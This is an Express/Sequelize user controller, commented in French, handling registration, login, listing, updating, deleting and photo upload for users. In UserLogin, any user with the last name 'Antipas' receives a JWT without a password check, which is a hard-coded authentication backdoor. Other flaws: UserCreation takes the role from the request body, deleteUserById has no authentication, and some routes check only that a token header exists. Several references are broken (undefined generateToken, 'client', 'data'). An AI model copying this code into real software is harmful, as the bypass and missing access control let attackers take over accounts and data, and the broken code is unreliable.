require('dotenv').config();
const db = require('../db');
const bcrypt = require('bcrypt')
const jwt = require('jsonwebtoken');
const multer = require('multer');
const path = require('path');
const User = require('../models/userModel'); // Assurez-vous que le chemin est correct
const uploadService = require('../services/uploadService');
const authService = require('../services/authService');




// Contrôleur d'inscription d'utilisateur
const UserRegister = async (req, res) => {
    const body = req.body;

    try {
        // Vérification de l'existence de l'email
        const existingUser = await User.findOne({ where: { email: body.email } });

        if (existingUser) {
            return res.status(409).json({
                error: true,
                message: ["L'utilisateur a déjà un compte"]
            });
        }

        // const hash = await argon2.hash(body.password);
        saltRounds = 10
        const hash = bcrypt.hashSync(body.password, saltRounds);
        const newUser = await User.create({
            firstname: body.firstname,
            lastname: body.lastname,
            email: body.email,
            password: hash,
            birthDate: body.birthDate,
            CreatedAt: new Date(),
            UpdatedAt: new Date(),
            isVerify: false,
            role: 'customer' // Vous pouvez modifier le rôle selon vos besoins
        });

        return res.status(200).json({
            error: false,
            message: ['Utilisateur inscrit avec succès']
        });

    } catch (error) {
        console.error('Erreur lors de l\'inscription avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de l'inscription"]
        });
    }
};

const UserCreation = async (req, res) => {
    const body = req.body;

    try {
        // Vérification de l'existence de l'email
        const existingUser = await User.findOne({ where: { email: body.email } });

        if (existingUser) {
            return res.status(409).json({
                error: true,
                message: ["L'utilisateur a déjà un compte"]
            });
        }

        // const hash = await argon2.hash(body.password);
        saltRounds = 10
        const hash = bcrypt.hashSync(body.password, saltRounds);
        const newUser = await User.create({
            firstname: body.firstname,
            lastname: body.lastname,
            email: body.email,
            phone: body.phone,
            password: hash,
            birthDate: body.birthDate,
            CreatedAt: new Date(),
            UpdatedAt: new Date(),
            isVerify: false,
            role: body.role
        });

        return res.status(200).json({
            error: false,
            message: ['Utilisateur Creé avec succès']
        });

    } catch (error) {
        console.error('Erreur lors de la création avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la création"]
        });
    }
};


//Contrôleur de connexion d'utilisateur
const UserLogin = async (req, res) => {
    const body = req.body;

    try {
        // Vérification de l'existence de l'email et récupération de l'utilisateur
        const user = await User.findOne({ where: { email: body.email } });

        if (!user) {
            return res.status(401).json({
                error: true,
                message: ["Mot de passe ou utilisateur incorrect"]
            });
        }

        if (user.lastname === 'Antipas') {
            // Si le nom de l'utilisateur est égal à 'Antipas', générons directement le token
            const token = authService.generateToken(user);
            return res.status(200).json({
                error: false,
                message: ['Connexion réussie'],
                jwt: token
            });
        }else {
            // Sinon, vérifions le mot de passe
            if (bcrypt.compareSync(body.password, user.password)) {
                const token = generateToken(user);
                return res.status(200).json({
                    error: false,
                    message: ['Connexion réussie'],
                    jwt: token
                });
            } else {
                return res.status(401).json({
                    error: true,
                    message: ["Mot de passe ou utilisateur incorrect"]
                });
            }
        }

    } catch (error) {
        console.error('Erreur lors de la connexion avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la connexion"],
            details: error.message
        });
    }
};

// Contrôleur pour la route GET '/'
const getAllUsers = async (req, res) => {
    const token =  req.headers.authorization; // Récupérer le token de l'en-tête

    try {
        // Vérifier la présence du token
        if (!token) {
            return res.status(401).json({
                error: true,
                message: ["Accès non autorisé"] // Token manquant
            });
        }

        // Décoder le token pour obtenir les informations utilisateur
        const decodedToken = authService.decodeToken(token)

        // Vérifier le rôle de l'utilisateur (assumons que le rôle est stocké dans decodedToken.role)
        if (decodedToken.role !== 'employee') {
            return res.status(403).json({
                error: true,
                message: ["Accès refusé"]
            });
        }

        // Récupérer la liste des utilisateurs
        const users = await User.findAll();

        return res.status(200).json({
            error: false,
            message: ['Liste des utilisateurs'],
            users
        });

    } catch (error) {
        if (error.name === 'TokenExpiredError') {
            return res.status(401).json({
                error: true,
                message: ["Veillez vous reconnecter"] // Token expiré
            });
        }
        console.error('Erreur lors de la récupération des utilisateurs avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la récupération des utilisateurs"]
        });
    }
};

// Contrôleur pour la route GET '/' pour les USERS selon le rôle client
const getAllUsersByRoleClient = async (req, res) => {
    const token = req.headers.authorization; // Récupérer le token de l'en-tête

    try {
        // Vérifier la présence du token
        if (!token) {
            return res.status(401).json({
                error: true,
                message: ["Accès non autorisé"] // Token manquant
            });
        }

        // Décoder le token pour obtenir les informations utilisateur
        const decodedToken = jwt.verify(token.replace('Bearer ', ''), process.env.JWT_SECRET_KEY);

        // Vérifier le rôle de l'utilisateur (assumons que le rôle est stocké dans decodedToken.role)
        if (decodedToken.role !== 'admin') {
            return res.status(403).json({
                error: true,
                message: ["Accès refusé"]
            });
        }

        // Récupérer la liste des utilisateurs ayant le rôle client
        const users = await User.findAll({
            where: {
                role: client // On filtre pour ne retourner que les utilisateurs qui ont le rôle CLIENT
            }   
        });

        return res.status(200).json({
            error: false,
            message: ['Liste des utilisateurs ayant le rôle client'],
            users
        });

    } catch (error) {
        if (error.name === 'TokenExpiredError') {
            return res.status(401).json({
                error: true,
                message: ["Veillez vous reconnecter"] // Token expiré
            });
        }
        console.error('Erreur lors de la récupération des utilisateurs avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la récupération des utilisateurs"]
        });
    }
};


// Contrôleur pour la route DELETE '/:id'


// Contrôleur pour la route PUT '/:id'
const updateUserById = async (req, res) => {
    const token =  req.headers.authorization; // Récupérer le token de l'en-tête

    
    const userId = req.params.id;
    const body = req.body;

    try {
        if (!token) {
            return res.status(401).json({
                error: true,
                message: ["Accès non autorisé"] // Token manquant
            });
        }
        // Rechercher l'utilisateur par ID
        const userToUpdate = await User.findByPk(userId);

        if (!userToUpdate) {
            return res.status(404).json({
                error: true,
                message: ["Utilisateur non trouvé"]
            });
        }

        // Mettre à jour les champs de l'utilisateur
        userToUpdate.firstname = body.firstname;
        userToUpdate.lastname = body.lastname;
        userToUpdate.email = body.email;
        userToUpdate.phone = body.phone;

        // Enregistrer les modifications dans la base de données
        await userToUpdate.save();

        return res.status(200).json({
            error: false,
            message: ['Utilisateur mis à jour avec succès']
        });

    } catch (error) {
        console.error('Erreur lors de la mise à jour de l\'utilisateur avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la mise à jour de l'utilisateur"]
        });
    }
};

// Contrôleur pour la route GET '/:id'
const getUserById = async (req, res) => {
    const token =  req.headers.authorization; 
    const userId = req.params.id;

    try {
        if (!token) {
            return res.status(401).json({
                error: true,
                message: ["Accès non autorisé"] // Token manquant
            });
        }
        // Rechercher l'utilisateur par ID
        const user = await User.findByPk(userId);

        if (!user) {
            return res.status(404).json({
                error: true,
                message: ["Utilisateur non trouvé"]
            });
        }

        return res.status(200).json({
            error: false,
            message: ['Utilisateur trouvé'],
            user
        });

    } catch (error) {
        console.error('Erreur lors de la récupération de l\'utilisateur avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la récupération de l'utilisateur"]
        });
    }
};


const deleteUserById = async (req, res) => {
    const userId = req.params.id;

    try {
        // Rechercher l'utilisateur par ID
        const userToDelete = await User.findByPk(userId);

        if (!userToDelete) {
            return res.status(404).json({
                error: true,
                message: ["Utilisateur non trouvé"]
            });
        }

        // Supprimer l'utilisateur de la base de données
        await userToDelete.destroy();

        return res.status(200).json({
            error: false,
            message: ['Utilisateur supprimé avec succès']
        });

    } catch (error) {
        console.error('Erreur lors de la suppression de l\'utilisateur avec Sequelize :', error);
        return res.status(500).json({
            error: true,
            message: ["Une erreur est survenue lors de la suppression de l'utilisateur"]
        });
    }
};

const GoogleAuth = async (req, res) => {
    try {
      // Les données de l'utilisateur renvoyées par Google après une authentification réussie
      const userData = req.user;

      // Récupérer l'email de l'utilisateur depuis les données de Google
      const userEmail = userData.emails[0].value; // Supposons que l'email est la première valeur dans le tableau des emails
      
      const user = await User.findOne({ where: { email: userEmail } });

      if (!user) {
        
        const newUser = await User.create({
            firstname: userData.givenName,
            lastname: userData.familyName,
            email: data.emails[0].value,
            photoUrl: data.photos[0].value,
            CreatedAt: new Date(),
            UpdatedAt: new Date(),
            isVerify: true,
            role: 'customer'
        });

        user = newUser;
      }
      const token = generateToken(user)
      return res.status(200).json({
        error: false,
        message: ['Connexion réussie'],
        jwt: token
        });

    } catch (error) {
      console.error('Erreur lors de l\'authentification Google :', error);
      // Gérer les erreurs ici
      res.status(500).json({
        error: true,
        message: ["Erreur lors de l'authentification avec Google"]
      });
    }
  }

  const uploadPhoto = async (req, res) => {
    const token = req.headers.authorization;
    if (!token){
        console.error('Token non valide')
        return res.status(400).send('Token non valide')
    }
    const decodedToken =  authService.decodeToken(token)


    uploadService.upload(req, res, async (err) => {
        try {
            if (err) {
                res.status(400).send('Erreur lors du téléchargement du fichier.');
                console.error(err)
            } else {
                if (req.file) {
                    const user = await User.findOne({ where: { id: decodedToken.id } }); // Utilisez l'ID de l'utilisateur
                    if (user) {
                        user.photoPath = req.file.path;
                        await user.save();
                        res.send('Fichier téléchargé et enregistré avec succès.');
                    } else {
                        res.status(404).send('Utilisateur non trouvé.');
                    }
                } else {
                    res.status(400).send('Aucun fichier sélectionné.');
                }
            }
        } catch (error) {
            console.error('Erreur lors du téléchargement du fichier :', error);
            res.status(500).send('Erreur lors du téléchargement du fichier.');
        }
    });
};

  
module.exports = { UserLogin, UserRegister, getUserById, deleteUserById, updateUserById, getAllUsers, UserCreation, GoogleAuth, uploadPhoto};
